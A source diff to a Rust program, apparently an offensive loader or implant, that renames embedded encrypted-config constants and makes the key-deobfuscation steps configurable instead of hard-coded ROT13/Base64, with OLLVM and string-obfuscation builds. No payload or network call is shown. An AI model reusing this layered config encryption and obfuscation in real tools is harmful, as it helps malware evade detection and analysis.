@@ -21,18 +21,24 @@ use cryptify;
 // ------ STANDARD compilation
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const INITIAL_LOADER : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead"));
+const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead"));
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead.dataop.rot13b64"));
+const OFUSCATED_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated"));
+#[rustfmt::skip]
+#[cfg(not(feature="ollvm"))]
+const DECRYPT_KEY_OBFUSCATION: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated.dataop"));
 
 // ------ OLLVM compilation from docker
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aead");
+const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead");
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.json.aead.dataop.rot13b64");
+const OFUSCATED_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated");
+#[rustfmt::skip]
+#[cfg(feature="ollvm")]
+const DECRYPT_KEY_OBFUSCATION: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated.dataop");
 
 fn main() {
     #[cfg(feature = "logdebug")]
@@ -41,9 +47,10 @@ fn main() {
     let session_id: String = uuid::Uuid::new_v4().to_string();
     info!("{}{}", lc!("[+] session_id: "),session_id);
 
-    let loader_conf_encrypted = INITIAL_LOADER.to_vec();
-    let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
-    let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
+    let loader_conf_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
+    let data_op_encrypted = OFUSCATED_DECRYPT_KEY.to_vec();
+    //let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
+    let ope_for_data_op: Vec<DataOperation> = serde_json::from_slice(DECRYPT_KEY_OBFUSCATION.to_vec().as_slice()).unwrap();
     let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
     let dataoperation: Vec<DataOperation> =
         serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
